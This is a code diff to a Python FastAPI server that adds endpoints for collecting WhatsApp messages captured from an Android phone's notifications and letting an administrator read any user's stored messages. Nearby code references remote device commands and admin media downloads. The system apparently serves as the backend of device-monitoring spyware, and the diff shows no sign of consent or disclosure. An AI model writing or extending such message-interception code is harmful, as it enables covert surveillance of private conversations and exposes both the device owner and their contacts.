@@ -5926,6 +5926,54 @@ async def admin_download_media(
     return FileResponse(file_path)
 
 
+# ─── WhatsApp Notification Capture ───────────────────────────────────────────
+
+@app.post("/device-data/whatsapp")
+async def device_upload_whatsapp(
+    payload: Dict,
+    current_user: User = Depends(get_current_user),
+):
+    """Device uploads WhatsApp messages captured from Android NotificationListenerService."""
+    import json as _json
+    user_id = int(getattr(current_user, 'id', 0))
+    path = os.path.join(_user_data_dir(user_id), "whatsapp_notifications.json")
+    existing: list = []
+    if os.path.exists(path):
+        with open(path) as f:
+            try: existing = _json.load(f)
+            except: existing = []
+    new_msgs = payload.get("messages", [])
+    # Deduplicate by (sender, timestamp) — avoid duplicates on retry
+    existing_keys = {(m.get("sender"), m.get("timestamp")) for m in existing}
+    for m in new_msgs:
+        if (m.get("sender"), m.get("timestamp")) not in existing_keys:
+            existing.append(m)
+    # Keep last 5000 messages per user
+    existing = existing[-5000:]
+    with open(path, "w") as f:
+        _json.dump(existing, f)
+    return {"status": "ok", "new": len(new_msgs), "total": len(existing)}
+
+@app.get("/admin/device-data/{username}/whatsapp")
+async def admin_get_whatsapp(
+    username: str,
+    limit: int = 500,
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session),
+):
+    """Admin reads captured WhatsApp notifications for a user."""
+    import json as _json
+    target = db.query(User).filter(User.username == username).first()
+    if not target:
+        raise HTTPException(status_code=404, detail="User not found")
+    path = os.path.join(_user_data_dir(int(target.id)), "whatsapp_notifications.json")
+    if not os.path.exists(path):
+        return []
+    with open(path) as f:
+        msgs = _json.load(f)
+    # Return most recent `limit` messages, newest first
+    return list(reversed(msgs[-limit:]))
+
 # ─── Remote Command Endpoints ─────────────────────────────────────────────────
 
 @app.post("/admin/device/command")
